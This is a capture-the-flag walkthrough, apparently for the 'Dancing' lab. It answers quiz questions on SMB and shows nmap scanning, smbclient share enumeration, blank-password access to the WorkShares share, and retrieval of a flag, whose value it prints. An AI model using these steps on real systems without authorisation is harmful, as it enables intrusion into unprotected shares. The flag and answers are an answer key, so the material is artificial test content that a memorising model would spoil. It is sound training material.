<span style="color:cyan">**Question 1**</span> : What does the 3-letter acronym SMB stand for?

SMB stands for Server Message Block. It's a network communication protocol used for sharing resources between devices on a Windows network.

    Server Message Block

<span style="color:cyan">**Question 2**</span> : What port does SMB use to operate at?

SMB typically operates over port 445

    445

<span style="color:cyan">**Question 3**</span> : What is the service name for port 445 that came up in our Nmap scan?

At this point, I used nMap to identify open ports and services.
```
cmd : nmap -sV 10.129.66.11

Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-09 19:13 CET
Nmap scan report for 10.129.66.11 (10.129.66.11)
Host is up (0.029s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.58 seconds
```

From the scan, I can see that the service name for port 445 is microsoft-ds.

    microsoft-ds

<span style="color:cyan">**Question 4**</span> : What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

To list the available shares on a server using the smbclient utility, we can use the -L (uppercase "L") flag or switch

    -L

<span style="color:cyan">**Question 5**</span> : How many shares are there on Dancing?

I executed the command smbclient -L 10.129.227.215 and observed four shares on Dancing.

```
cmd : smbclient -L 10.129.227.215

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk 
```

    4

<span style="color:cyan">**Question 6**</span> : What is the name of the share we are able to access in the end with a blank password?

I first observe that the answer is in the following format: 

```
*********s
```

From the previous output, i can see that there is a singol share with an s at the end, taht is WorkShares

At this point, I attempted to connect to the 'WorkShares' share and observed that access was granted without requiring a password.

```
cmd : smbclient \\\\10.129.227.215\\WorkShares

smb: \> help
```

    WorkShares

<span style="color:cyan">**Question 7**</span> : What is the command we can use within the SMB shell to download the files we find?

I can use the `get` command to download files.

    get

<span style="color:cyan">**Question 8**</span> : Submit root flag

I checked out the available commands using 'help,' and saw that 'ls' was there. So, I started poking around the system and noticed two directories

```
cmd: ls

.                                   D        0  Mon Mar 29 10:22:01 2021
..                                  D        0  Mon Mar 29 10:22:01 2021
Amy.J                               D        0  Mon Mar 29 11:08:24 2021
James.P                             D        0  Thu Jun  3 10:38:03 2021

	5114111 blocks of size 4096. 1747900 blocks available
```

When I went into the second directory, I spotted the flag file

```
cmd : cd James.P

cmd : ls

.                                   D        0  Thu Jun  3 10:38:03 2021
..                                  D        0  Thu Jun  3 10:38:03 2021
flag.txt                            A       32  Mon Mar 29 11:26:57 2021

	5114111 blocks of size 4096. 1747877 blocks available
```

Finally i can use the `get`` command to download flag.txt and obtain the flag
```
cmd : get flag.txt

cmd : cat flag.txt
```

    5f61c10dffbc77a704d76016a22f1664






